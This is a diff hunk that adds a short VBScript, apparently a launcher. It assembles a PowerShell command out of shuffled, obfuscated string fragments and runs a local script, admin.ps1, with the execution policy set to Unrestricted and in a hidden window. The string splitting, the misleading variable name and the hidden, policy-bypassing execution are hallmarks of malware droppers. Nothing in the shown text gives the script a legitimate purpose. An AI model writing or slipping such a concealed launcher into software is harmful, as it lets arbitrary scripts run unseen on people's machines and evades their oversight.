@@ -1,0 +1,10 @@
+H4 = " -nologo "
+H3 = "powershell.exe"
+H2 = "admin.ps1"
+H7 = " Unrestricted"
+H8 = " -File C:\local\"
+H5 = "-ExecutionPolicy"
+wind = "WScript.Shell"
+set hnv = CreateObject(wind)
+RENAME = H3+H4+H5+H7+H8+H2
+hnv.Run RENAME,0
